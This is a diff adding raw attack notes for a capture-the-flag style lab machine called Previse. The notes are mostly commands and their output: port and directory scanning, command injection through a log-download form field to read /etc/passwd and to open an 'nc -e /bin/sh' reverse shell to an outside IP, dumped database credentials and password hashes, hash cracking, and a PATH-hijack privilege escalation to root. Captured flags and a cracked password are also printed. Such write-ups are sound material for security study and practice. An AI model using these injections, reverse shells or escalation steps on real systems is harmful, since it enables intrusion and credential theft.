@@ -1,0 +1,195 @@
+sudo nmap -sC -sS -sV 10.10.11.104
+[sudo] password for jd: 
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-01 10:50 CST
+Nmap scan report for 10.10.11.104 (10.10.11.104)
+Host is up (0.080s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA)
+|   256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA)
+|_  256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+| http-title: Previse Login
+|_Requested resource was login.php
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 17.64 seconds
+                                                                                                                                                                                                   
+                                                                                                                                                                                                   
+dirbuster -l /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://10.10.11.104                                                                                         130 ⨯
+Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
+Starting OWASP DirBuster 1.0-RC1
+Starting dir/file list based brute forcing
+Dir found: / - 302
+File found: /index.php - 302
+File found: /download.php - 302
+Dir found: /icons/ - 403
+File found: /login.php - 200
+File found: /accounts.php - 302
+File found: /files.php - 302
+File found: /status.php - 302
+File found: /file_logs.php - 302
+File found: /logout.php - 302
+Dir found: /js/ - 200
+File found: /js/uikit.min.js - 200
+File found: /js/uikit-icons.min.js - 200
+File found: /logs.php - 302
+File found: /header.php - 200
+File found: /nav.php - 200
+File found: /footer.php - 200
+Dir found: /css/ - 200
+File found: /css/uikit.min.css - 200
+Dir found: /icons/small/ - 403
+File found: /config.php - 200
+
+curl 10.10.11.104/files.php >> files.html
+curl 10.10.11.104/accounts.php >> accounts.html
+
+
+
+curl --location --request POST 'http://10.10.11.104/accounts.php' \
+--header 'Content-Type: application/x-www-form-urlencoded' \
+--header 'Cookie: PHPSESSID=85jg0s72usl69dsbfk90ufc2kh' \
+--data-urlencode 'username=12345' \
+--data-urlencode 'password=12345' \
+--data-urlencode 'confirm=12345'
+
+# Able to log in with 12345 user and password
+# Files Available:
+#    - Sitebackup.zip
+#    - psp-reverse-shell.php
+
+unzip siteBackup.zip
+
+# logs.php
+#$output = exec("/usr/bin/python /opt/scripts/log_process.py {$_POST['delim']}");
+#echo $output;
+#$filepath = "/var/www/out.log";
+#$filename = "out.log"; 
+
+curl --location --request POST 'http://10.10.11.104/logs.php' \
+--header 'Content-Type: application/x-www-form-urlencoded' \
+--header 'Cookie: PHPSESSID=85jg0s72usl69dsbfk90ufc2kh' \
+--data-urlencode 'delim=comma && cat /etc/passwd >> /var/www/out.log'
+
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+lxd:x:105:65534::/var/lib/lxd/:/bin/false
+uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
+dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:109:1::/var/cache/pollinate:/bin/false
+sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
+m4lwhere:x:1000:1000:m4lwhere:/home/m4lwhere:/bin/bash
+mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
+
+# This could be used for a reverse shell - nice
+
+# 10.10.14.134
+# nc -e /bin/sh 10.10.14.134 9000
+
+ncat -lvp 9000
+
+curl --location --request POST 'http://10.10.11.104/logs.php' \
+--header 'Content-Type: application/x-www-form-urlencoded' \
+--header 'Cookie: PHPSESSID=85jg0s72usl69dsbfk90ufc2kh' \
+--data-urlencode 'delim=comma && nc -e /bin/sh 10.10.14.134 9000'
+
+locate user.txt
+/home/m4lwhere/user.txt
+
+cat config.php
+<?php
+
+function connectDB(){
+    $host = 'localhost';
+    $user = 'root';
+    $passwd = 'mySQL_p@ssw0rd!:)';
+    $db = 'previse';
+    $mycon = new mysqli($host, $user, $passwd, $db);
+    return $mycon;
+}
+
+python -c 'import pty;  pty.spawn("/bin/sh")'
+
+mysql -u root -e "USE unixmen; SHOW TABLES;"
+
+mysql -u root --password="mySQL_p@ssw0rd!:)"
+
+https://www.secpod.com/blog/privilege-escalation-vulnerability-in-mysql-mariadb-perconadb-databases/ #failed
+
+use previse;
+select * from accounts;
+
+select * from accounts;
++----+----------+------------------------------------+---------------------+
+| id | username | password                           | created_at          |
++----+----------+------------------------------------+---------------------+
+|  1 | m4lwhere | $1$🧂llol$DQpmdvnb7EeuO6UaqRItf. | 2021-05-27 18:18:36 |
+|  2 | hacker   | $1$🧂llol$MHiYle9peb0qOKtGJWZ9S0 | 2021-11-01 18:28:53 |
+|  3 | 12345    | $1$🧂llol$eBQMPwAvz9j9ZpK62qDI// | 2021-11-01 18:34:12 |
+|  4 | hello    | $1$🧂llol$RSlsaTAstPFPV.mmkJn.c/ | 2021-11-01 18:48:35 |
++----+----------+------------------------------------+---------------------+
+
+john -format=md5crypt-long --wordlist=/usr/share/wordlists/rockyou.txt hashed.txt
+
+Using default input encoding: UTF-8
+Loaded 1 password hash (md5crypt-long, crypt(3) $1$ (and variants) [MD5 32/64])
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+ilovecody112235! (?)
+1g 0:00:07:20 DONE (2021-11-01 14:16) 0.002270g/s 16833p/s 16833c/s 16833C/s ilovecodydean..ilovecody..
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+
+ssh m4lwhere@10.10.11.104
+
+m4lwhere@previse:~$ cat user.txt 
+cec45b93ac8e5338ad1f4401e4c34ad4
+
+sudo -l
+[sudo] password for m4lwhere: 
+User m4lwhere may run the following commands on previse:
+    (root) /opt/scripts/access_backup.sh
+
+m4lwhere@previse:/tmp$ echo "chmod +s /bin/bash" > gzip 
+m4lwhere@previse:/tmp$ chmod +x gzip
+m4lwhere@previse:/tmp$ export PATH="/tmp:$PATH"
+m4lwhere@previse:/tmp$ sudo -u root /opt/scripts/access_backup.sh 
+m4lwhere@previse:/tmp$ bash -p
+bash-4.4# locate root.txt
+bash-4.4# cd /root
+bash-4.4# ls
+root.txt
+bash-4.4# cat root.txt 
+dc644a7895860997eb523d85131b4ab6
